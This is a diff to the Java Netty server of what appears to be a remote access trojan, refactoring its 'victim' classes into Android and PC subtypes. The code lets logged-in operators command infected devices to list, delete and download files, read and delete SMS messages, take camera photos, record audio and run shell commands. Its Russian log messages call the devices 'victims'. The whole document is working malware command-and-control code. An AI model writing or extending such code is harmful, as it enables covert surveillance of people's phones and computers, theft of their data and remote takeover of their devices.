@@ -24,15 +24,15 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
     @Override
     public void handlerRemoved(ChannelHandlerContext ctx) {
         User user = nettyServer.getUsers().get(ctx.channel().id());
-        Victim victim = nettyServer.getVictims().get(ctx.channel().id());
+        AVictim AVictim = nettyServer.getAVictims().get(ctx.channel().id());
         PCVictim pcVictim = nettyServer.getPcVictims().get(ctx.channel().id());
         SocketAddress address = ctx.channel().remoteAddress();
         if (user != null) {
             nettyServer.getUsers().remove(ctx.channel().id());
             System.out.println("Пользователь " + user.getLogin() + " отключился!");
-        } else if (victim != null) {
-            nettyServer.getVictims().remove(ctx.channel().id());
-            System.out.println("Жертва " + victim.getName() + " отключилась!");
+        } else if (AVictim != null) {
+            nettyServer.getAVictims().remove(ctx.channel().id());
+            System.out.println("Жертва " + AVictim.getName() + " отключилась!");
         } else if (pcVictim != null) {
             nettyServer.getPcVictims().remove(ctx.channel().id());
             System.out.println("ПК-Жертва " + pcVictim.getName() + " отключилась!");
@@ -49,10 +49,10 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
 
         JSONObject request = (JSONObject) message;
         User user = nettyServer.getUsers().get(ctx.channel().id());
-        Victim victim = nettyServer.getVictims().get(ctx.channel().id());
+        AVictim AVictim = nettyServer.getAVictims().get(ctx.channel().id());
         PCVictim pcVictim = nettyServer.getPcVictims().get(ctx.channel().id());
         if (user != null) receiveUserMessage(user, request);
-        else if (victim != null) receiveVictimMessage(victim, request);
+        else if (AVictim != null) receiveAVictimMessage(AVictim, request);
         else if (pcVictim != null) receivePCVictimMessage(pcVictim, request);
         else checkAuth(ctx, request);
     }
@@ -75,13 +75,22 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                 user.sendErrorCode(Config.INVALID_AUTH);
                 return;
             }
-            Victim targetVictim = null;
+            /*AVictim targetAVictim = null;
             PCVictim targetPCVictim = null;
             if (request.containsKey("victim")) {
-                targetVictim = nettyServer.getVictimByName((String) request.get("victim"));
+                targetAVictim = nettyServer.getAVictimByName((String) request.get("victim"));
                 targetPCVictim = nettyServer.getPCVictimByName((String) request.get("victim"));
-                if ((targetVictim == null || !targetVictim.getOwners().contains(user.getLogin())) &&
+                if ((targetAVictim == null || !targetAVictim.getOwners().contains(user.getLogin())) &&
                         (targetPCVictim == null || !targetPCVictim.getOwners().contains(user.getLogin()))) {
+                    user.sendErrorCode(Config.VICTIM_OFFLINE);
+                    return;
+                }
+            }*/
+            //updated code with using abstract class Victim
+            Victim targetVictim = null;
+            if (request.containsKey("victim")) {
+                targetVictim = nettyServer.getVictimByName((String) request.get("victim"));
+                if (targetVictim == null || !targetVictim.getOwners().contains(user.getLogin())) {
                     user.sendErrorCode(Config.VICTIM_OFFLINE);
                     return;
                 }
@@ -94,42 +103,33 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                     for (int i = 0; i < userVictims.size(); i++) {
                         JSONObject object = new JSONObject();
                         Victim victim = nettyServer.getVictimByName(userVictims.get(i));
-                        PCVictim pcVictim = nettyServer.getPCVictimByName(userVictims.get(i));
                         object.put("name", userVictims.get(i));
-                        object.put("online", (victim != null || pcVictim != null));
+                        object.put("online", victim != null);
                         victims.add(object);
                     }
                     user.sendGetVictims(victims);
                     break;
                 case "get.files":
-                    if (targetVictim != null)
-                        targetVictim.sendGetFiles((String) request.get("path"), user.getLogin());
-                    else targetPCVictim.sendGetFiles((String) request.get("path"), user.getLogin());
+                    /*if (targetAVictim != null)
+                        targetAVictim.sendGetFiles((String) request.get("path"), user.getLogin());
+                    else targetPCVictim.sendGetFiles((String) request.get("path"), user.getLogin());*/
+                    targetVictim.sendGetFiles((String) request.get("path"), user.getLogin());
                     break;
                 case "delete.file":
-                    if (targetVictim != null)
-                        targetVictim.sendDeleteFile((String) request.get("path"), user.getLogin());
-                    else targetPCVictim.sendDeleteFile((String) request.get("path"), user.getLogin());
+                    targetVictim.sendDeleteFile((String) request.get("path"), user.getLogin());
                     break;
                 case "rename.file":
-                    if (targetVictim != null)
-                        targetVictim.sendRenameFile((String) request.get("path"), (String) request.get("newPath"),
-                            user.getLogin());
-                    else targetPCVictim.sendRenameFile((String) request.get("path"), (String) request.get("newPath"),
-                            user.getLogin());
+                    targetVictim.sendRenameFile((String) request.get("path"), (String) request.get("newPath"),
+                        user.getLogin());
                     break;
                 case "make.dir":
-                    if (targetVictim != null)
-                        targetVictim.sendMakeDir((String) request.get("path"), user.getLogin());
-                    else targetPCVictim.sendMakeDir((String) request.get("path"), user.getLogin());
+                    targetVictim.sendMakeDir((String) request.get("path"), user.getLogin());
                     break;
                 case "get.file.info":
                     targetVictim.sendGetFileInfo((String) request.get("path"), user.getLogin());
                     break;
                 case "copy.file":
-                    if (targetVictim != null)
-                        targetVictim.sendCopyFile((String) request.get("path"), (String) request.get("newPath"), user.getLogin());
-                    else targetPCVictim.sendCopyFile((String) request.get("path"), (String) request.get("newPath"), user.getLogin());
+                    targetVictim.sendCopyFile((String) request.get("path"), (String) request.get("newPath"), user.getLogin());
                     break;
                 case "set.victim.name":
                     targetVictim.sendSetVictimName((String) request.get("newName"), user.getLogin());
@@ -138,23 +138,23 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                     targetVictim.sendSetLoginIps((JSONArray) request.get("ips"), user.getLogin());
                     break;
                 case "get.sms":
-                    targetVictim.sendGetSms((String) request.get("type"), (Long) request.get("count"), user.getLogin());
+                    ((AVictim) targetVictim).sendGetSms((String) request.get("type"), (Long) request.get("count"), user.getLogin());
                     break;
                 case "delete.sms":
-                    targetVictim.sendDeleteSms((Long) request.get("id"), user.getLogin());
+                    ((AVictim) targetVictim).sendDeleteSms((Long) request.get("id"), user.getLogin());
                     break;
                 case "take.picture":
-                    targetVictim.sendTakePicture((String) request.get("camera"), user.getLogin());
+                    ((AVictim) targetVictim).sendTakePicture((String) request.get("camera"), user.getLogin());
                     break;
                 case "start.audio.record":
-                    targetVictim.sendStartAudioRecord((Long) request.get("seconds"), user.getLogin());
+                    ((AVictim) targetVictim).sendStartAudioRecord((Long) request.get("seconds"), user.getLogin());
                     break;
                 case "download.file":
                     DownloadManager downloadManager = new DownloadManager(user, targetVictim, (String) request.get("path"));
                     downloadManager.start();
                     break;
                 case "cmd":
-                    targetPCVictim.sendCmd((String) request.get("command"), user.getLogin());
+                    ((PCVictim) targetVictim).sendCmd((String) request.get("command"), user.getLogin());
                     break;
                 default:
                     user.sendErrorCode(Config.INCORRECT_QUERY);
@@ -165,9 +165,9 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
         }
     }
 
-    private void receiveVictimMessage(Victim victim, JSONObject request) {
-        if (!checkCorrectVictimQuery(request)) {
-            victim.sendErrorCode(Config.INCORRECT_QUERY);
+    private void receiveAVictimMessage(AVictim AVictim, JSONObject request) {
+        if (!checkCorrectAVictimQuery(request)) {
+            AVictim.sendErrorCode(Config.INCORRECT_QUERY);
             return;
         }
         try {
@@ -180,47 +180,47 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
             String action = (String) request.get("action");
             switch (action) {
                 case "get.file.list":
-                    targetUser.sendGetFiles((JSONArray) request.get("files"), victim.getName());
+                    targetUser.sendGetFiles((JSONArray) request.get("files"), AVictim.getName());
                     break;
                 case "delete.file":
-                    targetUser.sendDeleteFile((String) request.get("code"), victim.getName());
+                    targetUser.sendDeleteFile((String) request.get("code"), AVictim.getName());
                     break;
                 case "rename.file":
-                    targetUser.sendRenameFile((String) request.get("code"), victim.getName());
+                    targetUser.sendRenameFile((String) request.get("code"), AVictim.getName());
                     break;
                 case "make.dir":
-                    targetUser.sendMakeDir((String) request.get("code"), victim.getName());
+                    targetUser.sendMakeDir((String) request.get("code"), AVictim.getName());
                     break;
                 case "get.file.info":
-                    targetUser.sendGetFileInfo((JSONObject) request.get("info"), victim.getName());
+                    targetUser.sendGetFileInfo((JSONObject) request.get("info"), AVictim.getName());
                     break;
                 case "copy.file":
-                    targetUser.sendCopyFile((String) request.get("code"), victim.getName());
+                    targetUser.sendCopyFile((String) request.get("code"), AVictim.getName());
                     break;
-                case "set.victim.name":
-                    targetUser.sendSetVictimName((String) request.get("code"), victim.getName());
+                case "set.AVictim.name":
+                    targetUser.sendSetVictimName((String) request.get("code"), AVictim.getName());
                     break;
                 case "set.login.ips":
-                    targetUser.sendSetLoginIps((String) request.get("code"), victim.getName());
+                    targetUser.sendSetLoginIps((String) request.get("code"), AVictim.getName());
                     break;
                 case "get.sms.list":
-                    targetUser.sendGetSms((JSONArray) request.get("sms"), (String) request.get("type"), victim.getName());
+                    targetUser.sendGetSms((JSONArray) request.get("sms"), (String) request.get("type"), AVictim.getName());
                     break;
                 case "delete.sms":
-                    targetUser.sendDeleteSms((String) request.get("code"), victim.getName());
+                    targetUser.sendDeleteSms((String) request.get("code"), AVictim.getName());
                     break;
                 case "take.picture":
-                    targetUser.sendTakePicture((String) request.get("code"), victim.getName());
+                    targetUser.sendTakePicture((String) request.get("code"), AVictim.getName());
                     break;
                 case "start.audio.record":
-                    targetUser.sendStartAudioRecord((String) request.get("code"), victim.getName());
+                    targetUser.sendStartAudioRecord((String) request.get("code"), AVictim.getName());
                     break;
                 default:
-                    victim.sendErrorCode(Config.INCORRECT_QUERY);
+                    AVictim.sendErrorCode(Config.INCORRECT_QUERY);
             }
         } catch (Exception e) {
             e.printStackTrace();
-            victim.sendErrorCode(Config.SERVER_ERROR);
+            AVictim.sendErrorCode(Config.SERVER_ERROR);
         }
     }
 
@@ -351,7 +351,7 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
         return true;
     }
 
-    private boolean checkCorrectVictimQuery(JSONObject request) {
+    private boolean checkCorrectAVictimQuery(JSONObject request) {
         String action = (String) request.get("action");
         //System.out.println("Action="+action);
         if (action == null) return false;
@@ -499,10 +499,10 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                 ctx.writeAndFlush(response);
                 return;
             }
-            Victim newVictim = new Victim(ctx, name);
-            nettyServer.getVictims().put(ctx.channel().id(), newVictim);
+            AVictim newAVictim = new AVictim(ctx, name);
+            nettyServer.getAVictims().put(ctx.channel().id(), newAVictim);
             System.out.println("Жертва " + name + " авторизовалась!");
-            newVictim.sendAuthVictim();
+            newAVictim.sendAuthVictim();
         } else if (action.equals("auth.pcvictim")) {
             String name = (String) request.get("name");
             if (name == null) {
